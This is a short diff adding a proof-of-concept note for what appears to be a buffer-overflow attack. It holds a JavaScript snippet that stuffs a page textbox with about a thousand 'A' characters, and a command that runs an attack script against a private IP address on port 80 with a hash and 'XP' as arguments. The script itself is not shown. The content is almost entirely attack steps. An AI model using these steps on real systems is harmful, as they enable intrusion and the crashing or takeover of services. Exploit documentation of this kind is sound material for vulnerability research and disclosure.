@@ -1,0 +1,8 @@
+POC:
+
+js:
+a = "A"
+for (var i = 0; i < 1000; i++) { a += "A" }
+document.getElementsByClassName('upfi_textbox')[0].value = a
+
+python attack.py 10.0.1.4 80 0836bd29289bcdc2b5d0db64101c6858166a1f5d XP
